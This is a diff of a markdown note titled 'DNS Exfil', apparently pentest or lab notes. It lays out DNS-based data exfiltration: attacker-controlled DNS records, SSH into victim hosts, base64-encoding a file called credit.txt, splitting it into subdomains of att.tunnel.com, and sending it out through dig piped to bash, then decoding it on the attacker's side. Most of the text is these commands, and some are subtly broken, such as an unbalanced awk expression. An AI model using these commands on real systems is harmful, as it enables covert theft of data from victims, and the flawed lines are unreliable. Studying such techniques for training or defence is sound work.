@@ -1,3 +1,5 @@
+# DNS Exfil
+
 ## Requirements: Control a domain and set up DNS Records (NS,A,TXT,etc)
 
 ### 1) Add an A record that points to attacker IP (Type:A, Subdomain Name:tlns, Value:ATTACKER_IP)
@@ -6,7 +8,7 @@
 
 ## Manual Exfil
 
-### 1) Get the required data that needs to be transfered
+### 1) Get the required data that needs to be transferred
 
 ### 2) Encode the file using one of the encoding techniques
 
@@ -20,20 +22,38 @@
 
 ### Example:
 
-#### 1) Jumpbox: ssh USER@DOMAIN or Attacker: ssh USER@VICTIM_IP -p 2322 (example)
+#### 1) Jumpbox: 
 
-#### 2) Attacker: sudo tcpdump -i eth0 udp port 53 -v 
+    ssh USER@DOMAIN or Attacker: ssh USER@VICTIM_IP -p 2322 (example)
 
-#### 3) Jumpbox: ssh USER@VICTIM2_DOMAIN or Attacker: ssh USER@VICRIM_IP -p 2122 (example)
+#### 2) Attacker: 
 
-#### 4) Victim2: credit.txt
+    sudo tcpdump -i eth0 udp port 53 -v 
 
-#### 5) cat credit.txt | base64
+#### 3) Jumpbox: 
 
-#### 6) cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.att.tunnel.com/' (Multiple DNS requests)
+    ssh USER@VICTIM2_DOMAIN or Attacker: ssh USER@VICRIM_IP -p 2122 (example)
 
-#### 7) cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ (Single DNS requests)
+#### 4) Victim2: 
 
-#### 8) cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $13' | bash (Send base64 data as subdomain)
+    credit.txt
 
-#### 9) Attacker: echo "BASE64_DATA" | cut -d "." -f1-8 | tr -d "." | base64 -d
+#### 5) 
+
+    cat credit.txt | base64
+
+#### 6) 
+
+    cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.att.tunnel.com/' (Multiple DNS requests)
+
+#### 7) 
+
+    cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ (Single DNS requests)
+
+#### 8) 
+
+    cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $13' | bash (Send base64 data as subdomain)
+
+#### 9) Attacker: 
+
+    echo "BASE64_DATA" | cut -d "." -f1-8 | tr -d "." | base64 -d
